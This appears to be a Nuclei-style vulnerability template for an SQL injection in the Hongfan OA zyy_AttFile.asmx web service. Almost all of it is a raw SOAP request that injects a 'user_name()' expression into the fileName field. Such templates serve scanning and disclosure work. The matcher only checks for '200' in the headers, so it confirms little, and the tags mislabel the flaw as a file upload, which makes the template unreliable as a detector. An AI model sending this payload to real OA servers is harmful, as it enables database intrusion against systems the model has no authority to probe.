id: hongfanOA-zyy-AttFile-asmx-SQL
info:
  name: 红帆OAzyy_AttFile.asmx SQL注入漏洞
  author: cnaq
  severity: critical
  description: 红帆OA zyy_AttFile.asmx SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%BA%A2%E5%B8%86OA%20zyy_AttFile.asmx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: hongfanOA,file,upload

requests:
  - raw:
      - |
        POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 383
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://tempuri.org/GetFileAtt"
        Accept-Encoding: gzip, deflate
        Connection: close

        <?xml version="1.0" encoding="utf-8"?><soap:Envelope
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
        xmlns="http://tempuri.org/"><fileName>1231=user_name()</fileName></GetFileAtt> </soap:Body></so
        ap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'